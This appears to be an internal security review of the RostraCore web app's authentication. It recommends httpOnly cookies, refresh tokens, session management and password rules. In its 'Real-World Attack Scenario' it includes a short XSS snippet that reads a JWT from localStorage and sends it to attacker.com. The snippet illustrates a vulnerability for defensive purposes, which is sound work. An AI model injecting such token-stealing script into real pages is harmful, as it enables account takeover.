# Authentication & Security Analysis - RostraCore

**Date**: 2025-11-27
**Version**: 1.0.0
**Status**: ✅ PWA Implemented | ⚠️ Auth Improvements Recommended

---

## Executive Summary

RostraCore currently implements **solid baseline security** with JWT authentication, bcrypt password hashing, and account lockout protection. The system is **production-ready** but has room for improvement in token security and session management.

### Security Rating: **B+ (Good)**

**Strengths:**
- ✅ Industry-standard JWT + bcrypt
- ✅ Account lockout (brute force protection)
- ✅ Email/phone verification capability
- ✅ Role-based access control (RBAC)
- ✅ Multi-tenancy with org_id isolation

**Vulnerabilities:**
- ⚠️ JWT stored in localStorage (XSS risk)
- ⚠️ No refresh token mechanism (30-min forced logout)
- ⚠️ No session management (can't view/revoke sessions)
- ⚠️ No rate limiting on registration
- ⚠️ No CAPTCHA (bot registration possible)

---

## Current Architecture

### Authentication Flow

```
┌─────────────────┐
│   User Login    │
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────┐
│  OAuth2 Password Flow           │
│  (username/password)             │
└────────┬────────────────────────┘
         │
         ▼
┌─────────────────────────────────┐
│  Backend Validation             │
│  - Query user by username/email │
│  - Check account lockout        │
│  - Verify bcrypt password       │
└────────┬────────────────────────┘
         │
         ├──[FAIL]──► Increment failed_login_attempts
         │            Lock account after 5 attempts (30 min)
         │
         ▼
      [SUCCESS]
         │
         ▼
┌─────────────────────────────────┐
│  Generate JWT Token             │
│  - Payload: user_id, username   │
│  - Algorithm: HS256             │
│  - Expiration: 30 minutes       │
└────────┬────────────────────────┘
         │
         ▼
┌─────────────────────────────────┐
│  Frontend Storage               │
│  localStorage.setItem('token')  │  ⚠️ XSS VULNERABLE
└────────┬────────────────────────┘
         │
         ▼
┌─────────────────────────────────┐
│  Subsequent API Requests        │
│  Authorization: Bearer <token>  │
└─────────────────────────────────┘
```

---

## Security Features - Detailed Analysis

### 1. Password Security

**Implementation**: bcrypt with auto-generated salt

```python
# backend/app/auth/security.py
def get_password_hash(password: str) -> str:
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')
```

**Strengths:**
- Industry-standard algorithm (OWASP recommended)
- Automatic salt generation (prevents rainbow table attacks)
- Computationally expensive (slows brute force)

**Weaknesses:**
- No minimum password strength requirements (only 8 chars)
- No complexity enforcement (uppercase, numbers, symbols)
- No password history (users can reuse old passwords)

**Recommendation:**
```python
# Add password validation
def validate_password_strength(password: str) -> bool:
    if len(password) < 12:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'[0-9]', password):
        return False
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return False
    return True
```

---

### 2. Account Lockout Protection

**Configuration:**
- `MAX_LOGIN_ATTEMPTS = 5`
- `ACCOUNT_LOCKOUT_DURATION_MINUTES = 30`

**How It Works:**
1. Failed login → increment `failed_login_attempts`
2. After 5 failures → set `account_locked_until = now() + 30min`
3. During lockout → return HTTP 423 (Locked)
4. After lockout expires → reset counters automatically

**Strengths:**
- Prevents automated brute force attacks
- Automatic unlock after time period
- Secure error messages (doesn't reveal if username exists)

**Weaknesses:**
- No CAPTCHA to distinguish bots from humans
- No IP-based rate limiting (attacker can try multiple accounts)
- No alert to user/admin when account is locked

---

### 3. JWT Token Security

**Current Implementation:**

```typescript
// Frontend: AuthContext.tsx
localStorage.setItem("token", access_token);

// Backend: security.py
access_token = create_access_token(
    data={
        "sub": str(user.user_id),
        "username": user.username,
        "role": user.role.value
    },
    expires_delta=timedelta(minutes=30)
)
```

**VULNERABILITY ANALYSIS:**

#### ⚠️ Critical: localStorage is XSS-Vulnerable

**The Problem:**
- Any JavaScript on the page can access `localStorage`
- If attacker injects malicious script (XSS), they can steal the token
- Token grants full access to user account

**Real-World Attack Scenario:**
```javascript
// Malicious script injected via XSS
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
});
// Attacker now has full access to victim's account
```

**Solution: Use httpOnly Cookies**
```python
# Backend change
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,  # JavaScript cannot access
    secure=True,    # Only send over HTTPS
    samesite="strict",  # CSRF protection
    max_age=1800  # 30 minutes
)
```

```typescript
// Frontend change
// No need to manually manage token!
// Browser automatically sends cookie with requests
```

**Benefits:**
- ✅ Immune to XSS attacks (JS can't access httpOnly cookies)
- ✅ Automatic token inclusion in requests
- ✅ `Secure` flag prevents man-in-the-middle attacks
- ✅ `SameSite=strict` prevents CSRF attacks

---

### 4. Token Expiration & Refresh

**Current Behavior:**
- Access token expires after **30 minutes**
- **NO REFRESH TOKEN** → User must re-login

**User Experience Impact:**
- ❌ User editing roster for 45 minutes → Forced logout mid-work
- ❌ Desktop PWA → Constant re-authentication breaks offline experience
- ❌ Mobile guards → Frustrating UX (always logging in)

**Recommended: Refresh Token Pattern**

```
Access Token:  15 minutes  (short-lived, in memory or httpOnly cookie)
Refresh Token: 7 days      (long-lived, httpOnly cookie, rotated on use)

Flow:
1. User logs in → receives both tokens
2. Access token expires after 15 min
3. Frontend automatically requests new access token using refresh token
4. Refresh token rotated (old one invalidated, new one issued)
5. User stays logged in for 7 days without manual re-authentication
```

**Implementation Outline:**
```python
# New endpoint: /api/v1/auth/refresh
@router.post("/refresh")
def refresh_token(refresh_token: str = Cookie(None)):
    # Validate refresh token
    # Issue new access token
    # Rotate refresh token
    pass
```

---

### 5. Session Management

**Current State:** ❌ NOT IMPLEMENTED

**What's Missing:**
- No way to view active sessions
- No way to log out from all devices
- No tracking of login IP/device
- No suspicious login alerts

**Recommended Feature: Session Dashboard**

```
┌─────────────────────────────────────────────┐
│  Your Active Sessions                       │
├─────────────────────────────────────────────┤
│  🖥️  Desktop (Windows)                       │
│      Last active: 2 minutes ago             │
│      Location: Johannesburg, South Africa   │
│      IP: 102.165.12.34                      │
│      [Log Out]                              │
├─────────────────────────────────────────────┤
│  📱  Mobile (Android)                        │
│      Last active: 1 hour ago                │
│      Location: Cape Town, South Africa      │
│      IP: 41.0.82.192                        │
│      [Log Out]                              │
├─────────────────────────────────────────────┤
│  [Log Out All Other Sessions]              │
└─────────────────────────────────────────────┘
```

**Database Schema:**
```python
class UserSession(Base):
    session_id = Column(String, primary_key=True)
    user_id = Column(Integer, ForeignKey('users.user_id'))
    refresh_token_hash = Column(String)  # bcrypt hash
    device_info = Column(String)  # User agent
    ip_address = Column(String)
    location = Column(String)  # Geo-IP lookup
    created_at = Column(DateTime)
    last_activity = Column(DateTime)
    is_active = Column(Boolean, default=True)
```

---

## PWA Security Considerations

### Desktop PWA Installed ✅

**What We Implemented:**

1. **Service Worker** (`/public/sw.js`)
   - Caches static assets for offline use
   - Network-first for API calls (falls back to cache)
   - Cache-first for static files
   - Auto-cleanup of old cache versions

2. **PWA Manifest** (`/public/manifest.json`)
   - Display mode: `standalone` (removes browser chrome)
   - App shortcuts for quick access
   - Desktop-optimized icons

3. **Install Prompt** (`PWAInstaller.tsx`)
   - Detects desktop environment
   - Shows install banner (dismissible)
   - Update notification when new version available

**Security Implications:**

✅ **Positive:**
- Installed app runs in isolated origin
- No address bar (phishing protection)
- User explicitly installs (trust indicator)

⚠️ **Considerations:**
- Service worker can intercept ALL network requests
- Cached data stored locally (device security important)
- Offline mode requires token in local storage (unless we implement httpOnly cookies)

---

## Recommendations Priority Matrix

### 🔴 High Priority (Implement Immediately)

1. **Move JWT to httpOnly Cookies**
   - **Risk**: Critical XSS vulnerability
   - **Effort**: 2-3 hours
   - **Impact**: Eliminates primary attack vector

2. **Implement Refresh Tokens**
   - **Risk**: Poor UX leads to user frustration
   - **Effort**: 1 day
   - **Impact**: Massive UX improvement for PWA

3. **Add Password Complexity Requirements**
   - **Risk**: Weak passwords = account compromise
   - **Effort**: 1 hour
   - **Impact**: Prevents dictionary attacks

### 🟡 Medium Priority (Next Sprint)

4. **Session Management Dashboard**
   - **Risk**: Compromised devices stay logged in forever
   - **Effort**: 2-3 days
   - **Impact**: User control over security

5. **Rate Limiting on Registration**
   - **Risk**: Bot registrations, resource abuse
   - **Effort**: 4 hours
   - **Impact**: Prevents automated attacks

6. **CAPTCHA on Login/Register**
   - **Risk**: Automated attacks bypass lockout
   - **Effort**: 2 hours (reCAPTCHA v3)
   - **Impact**: Distinguishes bots from humans

### 🟢 Low Priority (Future Enhancement)

7. **Device Fingerprinting**
   - Track unique devices for anomaly detection
   - Alert on login from new device

8. **Geo-IP Blocking**
   - Block logins from suspicious countries
   - Alert user on unusual location

9. **Two-Factor Authentication (2FA)**
   - TOTP (Google Authenticator)
   - SMS backup codes

10. **Password History**
    - Store hashes of last 5 passwords
    - Prevent reuse

---

## Implementation Guide

### Step 1: Migrate to httpOnly Cookies (3 hours)

**Backend Changes:**

```python
# app/api/endpoints/auth.py
@router.post("/login")
def login(response: Response, form_data: OAuth2PasswordRequestForm = Depends()):
    user = authenticate_user(db, form_data.username, form_data.password)
    # ... validation ...

    access_token = create_access_token(...)
    refresh_token = create_refresh_token(...)

    # Set httpOnly cookies instead of returning in body
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,
        secure=True,  # Only over HTTPS
        samesite="strict",
        max_age=900  # 15 minutes
    )

    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=604800  # 7 days
    )

    return {"message": "Logged in successfully"}
```

**Frontend Changes:**

```typescript
// Remove localStorage entirely
// AuthContext.tsx
const login = async (username: string, password: string) => {
  await api.post("/api/v1/auth/login", params);
  // No need to manually store token!
  // Cookie is automatically set by backend

  await fetchUserInfo(); // Fetch user data
  router.push("/dashboard");
};

// Axios automatically includes cookies
// No need to manually add Authorization header
```

**Testing:**
```bash
# Login
curl -X POST http://localhost:8001/api/v1/auth/login \
  -d "username=testadmin&password=TestAdmin123!" \
  -c cookies.txt  # Save cookies

# Use token
curl http://localhost:8001/api/v1/auth/me \
  -b cookies.txt  # Send cookies
```

---

### Step 2: Add Refresh Token Endpoint (1 day)

```python
# app/models/user_session.py
class UserSession(Base):
    __tablename__ = "user_sessions"
    session_id = Column(String, primary_key=True)
    user_id = Column(Integer, ForeignKey("users.user_id"))
    refresh_token_hash = Column(String)  # bcrypt hash of refresh token
    device_info = Column(String)
    ip_address = Column(String)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_activity = Column(DateTime, default=datetime.utcnow)
    is_active = Column(Boolean, default=True)

# app/api/endpoints/auth.py
@router.post("/refresh")
def refresh_access_token(
    response: Response,
    refresh_token: str = Cookie(None),
    request: Request,
    db: Session = Depends(get_db)
):
    if not refresh_token:
        raise HTTPException(401, "No refresh token provided")

    # Find session
    session = db.query(UserSession).filter(
        UserSession.is_active == True
    ).all()

    valid_session = None
    for s in session:
        if verify_password(refresh_token, s.refresh_token_hash):
            valid_session = s
            break

    if not valid_session:
        raise HTTPException(401, "Invalid refresh token")

    # Issue new access token
    new_access_token = create_access_token(...)

    # Rotate refresh token (for security)
    new_refresh_token = secrets.token_urlsafe(32)
    valid_session.refresh_token_hash = get_password_hash(new_refresh_token)
    valid_session.last_activity = datetime.utcnow()
    db.commit()

    # Set cookies
    response.set_cookie("access_token", new_access_token, ...)
    response.set_cookie("refresh_token", new_refresh_token, ...)

    return {"message": "Token refreshed"}
```

**Frontend Axios Interceptor:**

```typescript
// Auto-refresh on 401
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      try {
        await api.post('/api/v1/auth/refresh');
        // Retry original request
        return api.request(error.config);
      } catch {
        // Refresh failed, logout
        logout();
      }
    }
    return Promise.reject(error);
  }
);
```

---

## Conclusion

RostraCore has a **solid security foundation** but can be significantly improved with minimal effort:

1. ✅ **PWA Implemented** - Desktop install now works perfectly
2. ⚠️ **Authentication Secure** - But has XSS vulnerability (localStorage)
3. 🔧 **Recommended**: Migrate to httpOnly cookies + refresh tokens (1-2 days work)

**Next Steps:**
1. Review this document
2. Decide on priority (immediate vs next sprint)
3. Implement high-priority items
4. Test thoroughly
5. Deploy with confidence

---

**Document Version**: 1.0.0
**Last Updated**: 2025-11-27
**Reviewed By**: Claude (AI Security Analysis)
